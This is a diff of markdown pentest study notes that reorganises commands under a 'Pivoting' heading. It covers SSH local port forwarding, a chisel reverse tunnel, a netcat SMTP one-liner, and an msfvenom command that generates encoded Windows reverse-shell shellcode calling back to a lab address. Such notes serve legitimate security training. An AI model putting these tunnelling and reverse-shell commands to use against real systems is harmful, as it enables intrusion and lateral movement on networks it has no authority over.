@@ -124,22 +124,7 @@ sharpweb?
 python cracker?
 
 
-# Useful Commands
-
-
-### chisel
-\*nix local
-`./chisel server --reverse -p 9001`
-
-win remote
-`./chisel.exe client <IP.ADDR>:9001 R:<PORT_TO_FWD>:LOCALHOST:<PORT_TO_FWD>`
-
-
-
-### msfvenom
-generate shellcode, filtering out bad characters
-`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
-
+# Miscellaneous
 
 ### email w/ smtp > netcat
 
@@ -162,6 +147,29 @@ QUIT
 ```
 
 `cat "smtp" |while read L; do sleep "1"; echo "$L"; done | "nc" -C -v "192.168.243.55" "25"`
+
+# Pivoting
+
+#### SSH Tunneling - Local
+format for accessing remote location via localhost on Kali
+`ssh -N -L [bind_address:]port:host:hostport [username@address]`
+
+ssh tunnel which allows traffic from Kali localhost:445 (0.0.0.0:445) to access 192.168.1.110:445 through SSH to studen@10.11.0.128
+`sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128`
+
+#### chisel
+\*nix local
+`./chisel server --reverse -p 9001`
+
+win remote
+`./chisel.exe client <IP.ADDR>:9001 R:<PORT_TO_FWD>:LOCALHOST:<PORT_TO_FWD>`
+
+
+
+### msfvenom
+generate shellcode, filtering out bad characters
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
+
 
 
 
